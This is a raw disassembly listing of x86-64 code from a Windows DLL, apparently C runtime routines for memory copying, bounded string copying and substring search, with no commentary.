   1800057b4:	4c 8b d1             	mov    %rcx,%r10
   1800057b7:	eb 03                	jmp    0x1800057bc
   1800057b9:	4d 8b d3             	mov    %r11,%r10
   1800057bc:	4c 8d 0d 3d a8 ff ff 	lea    -0x57c3(%rip),%r9        # 0x180000000
   1800057c3:	43 8b 84 81 d0 57 00 	mov    0x57d0(%r9,%r8,4),%eax
   1800057ca:	00 
   1800057cb:	49 03 c1             	add    %r9,%rax
   1800057ce:	ff e0                	jmp    *%rax
   1800057d0:	14 58                	adc    $0x58,%al
   1800057d2:	00 00                	add    %al,(%rax)
   1800057d4:	18 58 00             	sbb    %bl,0x0(%rax)
   1800057d7:	00 23                	add    %ah,(%rbx)
   1800057d9:	58                   	pop    %rax
   1800057da:	00 00                	add    %al,(%rax)
   1800057dc:	2f                   	(bad)
   1800057dd:	58                   	pop    %rax
   1800057de:	00 00                	add    %al,(%rax)
   1800057e0:	44 58                	rex.R pop %rax
   1800057e2:	00 00                	add    %al,(%rax)
   1800057e4:	4d 58                	rex.WRB pop %r8
   1800057e6:	00 00                	add    %al,(%rax)
   1800057e8:	5f                   	pop    %rdi
   1800057e9:	58                   	pop    %rax
   1800057ea:	00 00                	add    %al,(%rax)
   1800057ec:	72 58                	jb     0x180005846
   1800057ee:	00 00                	add    %al,(%rax)
   1800057f0:	8e 58 00             	mov    0x0(%rax),%ds
   1800057f3:	00 98 58 00 00 ab    	add    %bl,-0x54ffffa8(%rax)
   1800057f9:	58                   	pop    %rax
   1800057fa:	00 00                	add    %al,(%rax)
   1800057fc:	bf 58 00 00 dc       	mov    $0xdc000058,%edi
   180005801:	58                   	pop    %rax
   180005802:	00 00                	add    %al,(%rax)
   180005804:	ed                   	in     (%dx),%eax
   180005805:	58                   	pop    %rax
   180005806:	00 00                	add    %al,(%rax)
   180005808:	07                   	(bad)
   180005809:	59                   	pop    %rcx
   18000580a:	00 00                	add    %al,(%rax)
   18000580c:	22 59 00             	and    0x0(%rcx),%bl
   18000580f:	00 46 59             	add    %al,0x59(%rsi)
   180005812:	00 00                	add    %al,(%rax)
   180005814:	49 8b c3             	mov    %r11,%rax
   180005817:	c3                   	ret
   180005818:	48 0f b6 02          	movzbq (%rdx),%rax
   18000581c:	41 88 02             	mov    %al,(%r10)
   18000581f:	49 8b c3             	mov    %r11,%rax
   180005822:	c3                   	ret
   180005823:	48 0f b7 02          	movzwq (%rdx),%rax
   180005827:	66 41 89 02          	mov    %ax,(%r10)
   18000582b:	49 8b c3             	mov    %r11,%rax
   18000582e:	c3                   	ret
   18000582f:	48 0f b6 02          	movzbq (%rdx),%rax
   180005833:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   180005838:	41 88 02             	mov    %al,(%r10)
   18000583b:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   180005840:	49 8b c3             	mov    %r11,%rax
   180005843:	c3                   	ret
   180005844:	8b 02                	mov    (%rdx),%eax
   180005846:	41 89 02             	mov    %eax,(%r10)
   180005849:	49 8b c3             	mov    %r11,%rax
   18000584c:	c3                   	ret
   18000584d:	48 0f b6 02          	movzbq (%rdx),%rax
   180005851:	8b 4a 01             	mov    0x1(%rdx),%ecx
   180005854:	41 88 02             	mov    %al,(%r10)
   180005857:	41 89 4a 01          	mov    %ecx,0x1(%r10)
   18000585b:	49 8b c3             	mov    %r11,%rax
   18000585e:	c3                   	ret
   18000585f:	48 0f b7 02          	movzwq (%rdx),%rax
   180005863:	8b 4a 02             	mov    0x2(%rdx),%ecx
   180005866:	66 41 89 02          	mov    %ax,(%r10)
   18000586a:	41 89 4a 02          	mov    %ecx,0x2(%r10)
   18000586e:	49 8b c3             	mov    %r11,%rax
   180005871:	c3                   	ret
   180005872:	48 0f b6 02          	movzbq (%rdx),%rax
   180005876:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   18000587b:	8b 52 03             	mov    0x3(%rdx),%edx
   18000587e:	41 88 02             	mov    %al,(%r10)
   180005881:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   180005886:	41 89 52 03          	mov    %edx,0x3(%r10)
   18000588a:	49 8b c3             	mov    %r11,%rax
   18000588d:	c3                   	ret
   18000588e:	48 8b 02             	mov    (%rdx),%rax
   180005891:	49 89 02             	mov    %rax,(%r10)
   180005894:	49 8b c3             	mov    %r11,%rax
   180005897:	c3                   	ret
   180005898:	48 0f b6 02          	movzbq (%rdx),%rax
   18000589c:	48 8b 4a 01          	mov    0x1(%rdx),%rcx
   1800058a0:	41 88 02             	mov    %al,(%r10)
   1800058a3:	49 89 4a 01          	mov    %rcx,0x1(%r10)
   1800058a7:	49 8b c3             	mov    %r11,%rax
   1800058aa:	c3                   	ret
   1800058ab:	48 0f b7 02          	movzwq (%rdx),%rax
   1800058af:	48 8b 4a 02          	mov    0x2(%rdx),%rcx
   1800058b3:	66 41 89 02          	mov    %ax,(%r10)
   1800058b7:	49 89 4a 02          	mov    %rcx,0x2(%r10)
   1800058bb:	49 8b c3             	mov    %r11,%rax
   1800058be:	c3                   	ret
   1800058bf:	48 0f b6 02          	movzbq (%rdx),%rax
   1800058c3:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   1800058c8:	48 8b 52 03          	mov    0x3(%rdx),%rdx
   1800058cc:	41 88 02             	mov    %al,(%r10)
   1800058cf:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   1800058d4:	49 89 52 03          	mov    %rdx,0x3(%r10)
   1800058d8:	49 8b c3             	mov    %r11,%rax
   1800058db:	c3                   	ret
   1800058dc:	8b 02                	mov    (%rdx),%eax
   1800058de:	48 8b 4a 04          	mov    0x4(%rdx),%rcx
   1800058e2:	41 89 02             	mov    %eax,(%r10)
   1800058e5:	49 89 4a 04          	mov    %rcx,0x4(%r10)
   1800058e9:	49 8b c3             	mov    %r11,%rax
   1800058ec:	c3                   	ret
   1800058ed:	48 0f b6 02          	movzbq (%rdx),%rax
   1800058f1:	8b 4a 01             	mov    0x1(%rdx),%ecx
   1800058f4:	48 8b 52 05          	mov    0x5(%rdx),%rdx
   1800058f8:	41 88 02             	mov    %al,(%r10)
   1800058fb:	41 89 4a 01          	mov    %ecx,0x1(%r10)
   1800058ff:	49 89 52 05          	mov    %rdx,0x5(%r10)
   180005903:	49 8b c3             	mov    %r11,%rax
   180005906:	c3                   	ret
   180005907:	48 0f b7 02          	movzwq (%rdx),%rax
   18000590b:	8b 4a 02             	mov    0x2(%rdx),%ecx
   18000590e:	48 8b 52 06          	mov    0x6(%rdx),%rdx
   180005912:	66 41 89 02          	mov    %ax,(%r10)
   180005916:	41 89 4a 02          	mov    %ecx,0x2(%r10)
   18000591a:	49 89 52 06          	mov    %rdx,0x6(%r10)
   18000591e:	49 8b c3             	mov    %r11,%rax
   180005921:	c3                   	ret
   180005922:	4c 0f b6 02          	movzbq (%rdx),%r8
   180005926:	48 0f b7 42 01       	movzwq 0x1(%rdx),%rax
   18000592b:	8b 4a 03             	mov    0x3(%rdx),%ecx
   18000592e:	48 8b 52 07          	mov    0x7(%rdx),%rdx
   180005932:	45 88 02             	mov    %r8b,(%r10)
   180005935:	66 41 89 42 01       	mov    %ax,0x1(%r10)
   18000593a:	41 89 4a 03          	mov    %ecx,0x3(%r10)
   18000593e:	49 89 52 07          	mov    %rdx,0x7(%r10)
   180005942:	49 8b c3             	mov    %r11,%rax
   180005945:	c3                   	ret
   180005946:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   18000594a:	f3 41 0f 7f 02       	movdqu %xmm0,(%r10)
   18000594f:	49 8b c3             	mov    %r11,%rax
   180005952:	c3                   	ret
   180005953:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000595a:	84 00 00 00 00 00 
   180005960:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   180005964:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   180005969:	48 83 c1 20          	add    $0x20,%rcx
   18000596d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   180005971:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   180005975:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   18000597a:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   18000597f:	49 ff c9             	dec    %r9
   180005982:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   180005986:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   18000598a:	75 d4                	jne    0x180005960
   18000598c:	49 83 e0 1f          	and    $0x1f,%r8
   180005990:	e9 f2 fd ff ff       	jmp    0x180005787
   180005995:	49 83 f8 20          	cmp    $0x20,%r8
   180005999:	0f 86 e1 00 00 00    	jbe    0x180005a80
   18000599f:	f6 c1 0f             	test   $0xf,%cl
   1800059a2:	75 0e                	jne    0x1800059b2
   1800059a4:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   1800059a8:	48 83 c1 10          	add    $0x10,%rcx
   1800059ac:	49 83 e8 10          	sub    $0x10,%r8
   1800059b0:	eb 1d                	jmp    0x1800059cf
   1800059b2:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   1800059b6:	48 83 c1 20          	add    $0x20,%rcx
   1800059ba:	80 e1 f0             	and    $0xf0,%cl
   1800059bd:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   1800059c2:	41 0f 11 0b          	movups %xmm1,(%r11)
   1800059c6:	48 8b c1             	mov    %rcx,%rax
   1800059c9:	49 2b c3             	sub    %r11,%rax
   1800059cc:	4c 2b c0             	sub    %rax,%r8
   1800059cf:	4d 8b c8             	mov    %r8,%r9
   1800059d2:	49 c1 e9 07          	shr    $0x7,%r9
   1800059d6:	74 66                	je     0x180005a3e
   1800059d8:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1800059dc:	eb 0a                	jmp    0x1800059e8
   1800059de:	66 90                	xchg   %ax,%ax
   1800059e0:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   1800059e4:	0f 29 49 f0          	movaps %xmm1,-0x10(%rcx)
   1800059e8:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   1800059ec:	0f 10 4c 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm1
   1800059f1:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1800059f8:	0f 29 41 80          	movaps %xmm0,-0x80(%rcx)
   1800059fc:	0f 29 49 90          	movaps %xmm1,-0x70(%rcx)
   180005a00:	0f 10 44 0a a0       	movups -0x60(%rdx,%rcx,1),%xmm0
   180005a05:	0f 10 4c 0a b0       	movups -0x50(%rdx,%rcx,1),%xmm1
   180005a0a:	49 ff c9             	dec    %r9
   180005a0d:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   180005a11:	0f 29 49 b0          	movaps %xmm1,-0x50(%rcx)
   180005a15:	0f 10 44 0a c0       	movups -0x40(%rdx,%rcx,1),%xmm0
   180005a1a:	0f 10 4c 0a d0       	movups -0x30(%rdx,%rcx,1),%xmm1
   180005a1f:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   180005a23:	0f 29 49 d0          	movaps %xmm1,-0x30(%rcx)
   180005a27:	0f 10 44 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm0
   180005a2c:	0f 10 4c 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm1
   180005a31:	75 ad                	jne    0x1800059e0
   180005a33:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   180005a37:	49 83 e0 7f          	and    $0x7f,%r8
   180005a3b:	0f 28 c1             	movaps %xmm1,%xmm0
   180005a3e:	4d 8b c8             	mov    %r8,%r9
   180005a41:	49 c1 e9 04          	shr    $0x4,%r9
   180005a45:	74 1a                	je     0x180005a61
   180005a47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180005a4e:	00 00 
   180005a50:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   180005a54:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   180005a58:	48 83 c1 10          	add    $0x10,%rcx
   180005a5c:	49 ff c9             	dec    %r9
   180005a5f:	75 ef                	jne    0x180005a50
   180005a61:	49 83 e0 0f          	and    $0xf,%r8
   180005a65:	74 0d                	je     0x180005a74
   180005a67:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   180005a6b:	0f 10 4c 02 f0       	movups -0x10(%rdx,%rax,1),%xmm1
   180005a70:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   180005a74:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   180005a78:	49 8b c3             	mov    %r11,%rax
   180005a7b:	c3                   	ret
   180005a7c:	0f 1f 40 00          	nopl   0x0(%rax)
   180005a80:	41 0f 10 02          	movups (%r10),%xmm0
   180005a84:	49 8d 4c 08 f0       	lea    -0x10(%r8,%rcx,1),%rcx
   180005a89:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   180005a8d:	41 0f 11 03          	movups %xmm0,(%r11)
   180005a91:	0f 11 09             	movups %xmm1,(%rcx)
   180005a94:	49 8b c3             	mov    %r11,%rax
   180005a97:	c3                   	ret
   180005a98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180005a9f:	00 
   180005aa0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180005aa4:	66 66 66 90          	data16 data16 xchg %ax,%ax
   180005aa8:	66 90                	xchg   %ax,%ax
   180005aaa:	0f ba 25 e2 52 01 00 	btl    $0x2,0x152e2(%rip)        # 0x18001ad94
   180005ab1:	02 
   180005ab2:	0f 82 b9 00 00 00    	jb     0x180005b71
   180005ab8:	49 03 c8             	add    %r8,%rcx
   180005abb:	f6 c1 07             	test   $0x7,%cl
   180005abe:	74 36                	je     0x180005af6
   180005ac0:	f6 c1 01             	test   $0x1,%cl
   180005ac3:	74 0b                	je     0x180005ad0
   180005ac5:	48 ff c9             	dec    %rcx
   180005ac8:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   180005acb:	49 ff c8             	dec    %r8
   180005ace:	88 01                	mov    %al,(%rcx)
   180005ad0:	f6 c1 02             	test   $0x2,%cl
   180005ad3:	74 0f                	je     0x180005ae4
   180005ad5:	48 83 e9 02          	sub    $0x2,%rcx
   180005ad9:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   180005add:	49 83 e8 02          	sub    $0x2,%r8
   180005ae1:	66 89 01             	mov    %ax,(%rcx)
   180005ae4:	f6 c1 04             	test   $0x4,%cl
   180005ae7:	74 0d                	je     0x180005af6
   180005ae9:	48 83 e9 04          	sub    $0x4,%rcx
   180005aed:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   180005af0:	49 83 e8 04          	sub    $0x4,%r8
   180005af4:	89 01                	mov    %eax,(%rcx)
   180005af6:	4d 8b c8             	mov    %r8,%r9
   180005af9:	49 c1 e9 05          	shr    $0x5,%r9
   180005afd:	75 41                	jne    0x180005b40
   180005aff:	4d 8b c8             	mov    %r8,%r9
   180005b02:	49 c1 e9 03          	shr    $0x3,%r9
   180005b06:	74 14                	je     0x180005b1c
   180005b08:	48 83 e9 08          	sub    $0x8,%rcx
   180005b0c:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   180005b10:	49 ff c9             	dec    %r9
   180005b13:	48 89 01             	mov    %rax,(%rcx)
   180005b16:	75 f0                	jne    0x180005b08
   180005b18:	49 83 e0 07          	and    $0x7,%r8
   180005b1c:	4d 85 c0             	test   %r8,%r8
   180005b1f:	75 0f                	jne    0x180005b30
   180005b21:	49 8b c3             	mov    %r11,%rax
   180005b24:	c3                   	ret
   180005b25:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180005b2c:	00 00 00 00 
   180005b30:	49 2b c8             	sub    %r8,%rcx
   180005b33:	4c 8b d1             	mov    %rcx,%r10
   180005b36:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
   180005b3a:	e9 7d fc ff ff       	jmp    0x1800057bc
   180005b3f:	90                   	nop
   180005b40:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   180005b45:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   180005b4a:	48 83 e9 20          	sub    $0x20,%rcx
   180005b4e:	48 89 41 18          	mov    %rax,0x18(%rcx)
   180005b52:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   180005b56:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   180005b5b:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   180005b5f:	49 ff c9             	dec    %r9
   180005b62:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180005b66:	4c 89 11             	mov    %r10,(%rcx)
   180005b69:	75 d5                	jne    0x180005b40
   180005b6b:	49 83 e0 1f          	and    $0x1f,%r8
   180005b6f:	eb 8e                	jmp    0x180005aff
   180005b71:	49 83 f8 20          	cmp    $0x20,%r8
   180005b75:	0f 86 05 ff ff ff    	jbe    0x180005a80
   180005b7b:	49 03 c8             	add    %r8,%rcx
   180005b7e:	f6 c1 0f             	test   $0xf,%cl
   180005b81:	75 0e                	jne    0x180005b91
   180005b83:	48 83 e9 10          	sub    $0x10,%rcx
   180005b87:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   180005b8b:	49 83 e8 10          	sub    $0x10,%r8
   180005b8f:	eb 1b                	jmp    0x180005bac
   180005b91:	48 83 e9 10          	sub    $0x10,%rcx
   180005b95:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   180005b99:	48 8b c1             	mov    %rcx,%rax
   180005b9c:	80 e1 f0             	and    $0xf0,%cl
   180005b9f:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   180005ba3:	0f 11 08             	movups %xmm1,(%rax)
   180005ba6:	4c 8b c1             	mov    %rcx,%r8
   180005ba9:	4d 2b c3             	sub    %r11,%r8
   180005bac:	4d 8b c8             	mov    %r8,%r9
   180005baf:	49 c1 e9 07          	shr    $0x7,%r9
   180005bb3:	74 68                	je     0x180005c1d
   180005bb5:	0f 29 01             	movaps %xmm0,(%rcx)
   180005bb8:	eb 0d                	jmp    0x180005bc7
   180005bba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180005bc0:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   180005bc4:	0f 29 09             	movaps %xmm1,(%rcx)
   180005bc7:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   180005bcc:	0f 10 4c 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm1
   180005bd1:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   180005bd8:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   180005bdc:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   180005be0:	0f 10 44 0a 50       	movups 0x50(%rdx,%rcx,1),%xmm0
   180005be5:	0f 10 4c 0a 40       	movups 0x40(%rdx,%rcx,1),%xmm1
   180005bea:	49 ff c9             	dec    %r9
   180005bed:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   180005bf1:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   180005bf5:	0f 10 44 0a 30       	movups 0x30(%rdx,%rcx,1),%xmm0
   180005bfa:	0f 10 4c 0a 20       	movups 0x20(%rdx,%rcx,1),%xmm1
   180005bff:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   180005c03:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   180005c07:	0f 10 44 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm0
   180005c0c:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   180005c10:	75 ae                	jne    0x180005bc0
   180005c12:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   180005c16:	49 83 e0 7f          	and    $0x7f,%r8
   180005c1a:	0f 28 c1             	movaps %xmm1,%xmm0
   180005c1d:	4d 8b c8             	mov    %r8,%r9
   180005c20:	49 c1 e9 04          	shr    $0x4,%r9
   180005c24:	74 1a                	je     0x180005c40
   180005c26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005c2d:	00 00 00 
   180005c30:	0f 29 01             	movaps %xmm0,(%rcx)
   180005c33:	48 83 e9 10          	sub    $0x10,%rcx
   180005c37:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   180005c3b:	49 ff c9             	dec    %r9
   180005c3e:	75 f0                	jne    0x180005c30
   180005c40:	49 83 e0 0f          	and    $0xf,%r8
   180005c44:	74 08                	je     0x180005c4e
   180005c46:	41 0f 10 0a          	movups (%r10),%xmm1
   180005c4a:	41 0f 11 0b          	movups %xmm1,(%r11)
   180005c4e:	0f 29 01             	movaps %xmm0,(%rcx)
   180005c51:	49 8b c3             	mov    %r11,%rax
   180005c54:	c3                   	ret
   180005c55:	cc                   	int3
   180005c56:	cc                   	int3
   180005c57:	cc                   	int3
   180005c58:	40 53                	rex push %rbx
   180005c5a:	48 83 ec 20          	sub    $0x20,%rsp
   180005c5e:	33 db                	xor    %ebx,%ebx
   180005c60:	4d 85 c9             	test   %r9,%r9
   180005c63:	75 0e                	jne    0x180005c73
   180005c65:	48 85 c9             	test   %rcx,%rcx
   180005c68:	75 0e                	jne    0x180005c78
   180005c6a:	48 85 d2             	test   %rdx,%rdx
   180005c6d:	75 1e                	jne    0x180005c8d
   180005c6f:	33 c0                	xor    %eax,%eax
   180005c71:	eb 2d                	jmp    0x180005ca0
   180005c73:	48 85 c9             	test   %rcx,%rcx
   180005c76:	74 15                	je     0x180005c8d
   180005c78:	48 85 d2             	test   %rdx,%rdx
   180005c7b:	74 10                	je     0x180005c8d
   180005c7d:	4d 85 c9             	test   %r9,%r9
   180005c80:	75 04                	jne    0x180005c86
   180005c82:	88 19                	mov    %bl,(%rcx)
   180005c84:	eb e9                	jmp    0x180005c6f
   180005c86:	4d 85 c0             	test   %r8,%r8
   180005c89:	75 1b                	jne    0x180005ca6
   180005c8b:	88 19                	mov    %bl,(%rcx)
   180005c8d:	e8 9e 19 00 00       	call   0x180007630
   180005c92:	bb 16 00 00 00       	mov    $0x16,%ebx
   180005c97:	89 18                	mov    %ebx,(%rax)
   180005c99:	e8 c6 18 00 00       	call   0x180007564
   180005c9e:	8b c3                	mov    %ebx,%eax
   180005ca0:	48 83 c4 20          	add    $0x20,%rsp
   180005ca4:	5b                   	pop    %rbx
   180005ca5:	c3                   	ret
   180005ca6:	4c 8b d9             	mov    %rcx,%r11
   180005ca9:	4c 8b d2             	mov    %rdx,%r10
   180005cac:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   180005cb0:	75 18                	jne    0x180005cca
   180005cb2:	4d 2b d8             	sub    %r8,%r11
   180005cb5:	41 8a 00             	mov    (%r8),%al
   180005cb8:	43 88 04 03          	mov    %al,(%r11,%r8,1)
   180005cbc:	49 ff c0             	inc    %r8
   180005cbf:	84 c0                	test   %al,%al
   180005cc1:	74 2a                	je     0x180005ced
   180005cc3:	49 ff ca             	dec    %r10
   180005cc6:	75 ed                	jne    0x180005cb5
   180005cc8:	eb 23                	jmp    0x180005ced
   180005cca:	4c 2b c1             	sub    %rcx,%r8
   180005ccd:	43 8a 04 18          	mov    (%r8,%r11,1),%al
   180005cd1:	41 88 03             	mov    %al,(%r11)
   180005cd4:	49 ff c3             	inc    %r11
   180005cd7:	84 c0                	test   %al,%al
   180005cd9:	74 0a                	je     0x180005ce5
   180005cdb:	49 ff ca             	dec    %r10
   180005cde:	74 05                	je     0x180005ce5
   180005ce0:	49 ff c9             	dec    %r9
   180005ce3:	75 e8                	jne    0x180005ccd
   180005ce5:	4d 85 c9             	test   %r9,%r9
   180005ce8:	75 03                	jne    0x180005ced
   180005cea:	41 88 1b             	mov    %bl,(%r11)
   180005ced:	4d 85 d2             	test   %r10,%r10
   180005cf0:	0f 85 79 ff ff ff    	jne    0x180005c6f
   180005cf6:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   180005cfa:	75 0a                	jne    0x180005d06
   180005cfc:	88 5c 11 ff          	mov    %bl,-0x1(%rcx,%rdx,1)
   180005d00:	41 8d 42 50          	lea    0x50(%r10),%eax
   180005d04:	eb 9a                	jmp    0x180005ca0
   180005d06:	88 19                	mov    %bl,(%rcx)
   180005d08:	e8 23 19 00 00       	call   0x180007630
   180005d0d:	bb 22 00 00 00       	mov    $0x22,%ebx
   180005d12:	eb 83                	jmp    0x180005c97
   180005d14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005d19:	57                   	push   %rdi
   180005d1a:	48 83 ec 10          	sub    $0x10,%rsp
   180005d1e:	40 8a 3a             	mov    (%rdx),%dil
   180005d21:	48 8b da             	mov    %rdx,%rbx
   180005d24:	4c 8b c1             	mov    %rcx,%r8
   180005d27:	40 84 ff             	test   %dil,%dil
   180005d2a:	75 08                	jne    0x180005d34
   180005d2c:	48 8b c1             	mov    %rcx,%rax
   180005d2f:	e9 b2 01 00 00       	jmp    0x180005ee6
   180005d34:	83 3d e5 32 01 00 02 	cmpl   $0x2,0x132e5(%rip)        # 0x180019020
   180005d3b:	41 ba ff 0f 00 00    	mov    $0xfff,%r10d
   180005d41:	45 8d 5a f1          	lea    -0xf(%r10),%r11d
   180005d45:	0f 8d d0 00 00 00    	jge    0x180005e1b
   180005d4b:	40 0f b6 c7          	movzbl %dil,%eax
   180005d4f:	0f 57 d2             	xorps  %xmm2,%xmm2
   180005d52:	8b c8                	mov    %eax,%ecx
   180005d54:	c1 e1 08             	shl    $0x8,%ecx
   180005d57:	0b c8                	or     %eax,%ecx
   180005d59:	66 0f 6e c1          	movd   %ecx,%xmm0
   180005d5d:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   180005d62:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   180005d67:	49 8b c0             	mov    %r8,%rax
   180005d6a:	49 23 c2             	and    %r10,%rax
   180005d6d:	49 3b c3             	cmp    %r11,%rax
   180005d70:	77 29                	ja     0x180005d9b
   180005d72:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   180005d77:	66 0f 6f c8          	movdqa %xmm0,%xmm1
   180005d7b:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   180005d7f:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   180005d83:	66 0f eb c8          	por    %xmm0,%xmm1
   180005d87:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   180005d8b:	85 c0                	test   %eax,%eax
   180005d8d:	75 06                	jne    0x180005d95
   180005d8f:	49 83 c0 10          	add    $0x10,%r8
   180005d93:	eb d2                	jmp    0x180005d67
   180005d95:	0f bc c0             	bsf    %eax,%eax
   180005d98:	4c 03 c0             	add    %rax,%r8
   180005d9b:	41 80 38 00          	cmpb   $0x0,(%r8)
   180005d9f:	0f 84 3f 01 00 00    	je     0x180005ee4
   180005da5:	41 3a 38             	cmp    (%r8),%dil
   180005da8:	75 69                	jne    0x180005e13
   180005daa:	49 8b d0             	mov    %r8,%rdx
   180005dad:	4c 8b cb             	mov    %rbx,%r9
   180005db0:	49 8b c1             	mov    %r9,%rax
   180005db3:	49 23 c2             	and    %r10,%rax
   180005db6:	49 3b c3             	cmp    %r11,%rax
   180005db9:	77 41                	ja     0x180005dfc
   180005dbb:	48 8b c2             	mov    %rdx,%rax
   180005dbe:	49 23 c2             	and    %r10,%rax
   180005dc1:	49 3b c3             	cmp    %r11,%rax
   180005dc4:	77 36                	ja     0x180005dfc
   180005dc6:	f3 41 0f 6f 09       	movdqu (%r9),%xmm1
   180005dcb:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180005dcf:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   180005dd3:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   180005dd7:	66 0f 74 c2          	pcmpeqb %xmm2,%xmm0
   180005ddb:	66 0f eb c1          	por    %xmm1,%xmm0
   180005ddf:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   180005de3:	85 c0                	test   %eax,%eax
   180005de5:	75 0a                	jne    0x180005df1
   180005de7:	48 83 c2 10          	add    $0x10,%rdx
   180005deb:	49 83 c1 10          	add    $0x10,%r9
   180005def:	eb bf                	jmp    0x180005db0
   180005df1:	0f bc c0             	bsf    %eax,%eax
   180005df4:	8b c8                	mov    %eax,%ecx
   180005df6:	48 03 d1             	add    %rcx,%rdx
   180005df9:	4c 03 c9             	add    %rcx,%r9
   180005dfc:	41 8a 01             	mov    (%r9),%al
   180005dff:	84 c0                	test   %al,%al
   180005e01:	0f 84 d8 00 00 00    	je     0x180005edf
   180005e07:	38 02                	cmp    %al,(%rdx)
   180005e09:	75 08                	jne    0x180005e13
   180005e0b:	48 ff c2             	inc    %rdx
   180005e0e:	49 ff c1             	inc    %r9
   180005e11:	eb 9d                	jmp    0x180005db0
   180005e13:	49 ff c0             	inc    %r8
   180005e16:	e9 4c ff ff ff       	jmp    0x180005d67
   180005e1b:	48 8b c2             	mov    %rdx,%rax
   180005e1e:	49 23 c2             	and    %r10,%rax
   180005e21:	49 3b c3             	cmp    %r11,%rax
   180005e24:	77 06                	ja     0x180005e2c
   180005e26:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180005e2a:	eb 2b                	jmp    0x180005e57
   180005e2c:	48 8b ca             	mov    %rdx,%rcx
   180005e2f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180005e32:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   180005e38:	40 8a d7             	mov    %dil,%dl
   180005e3b:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
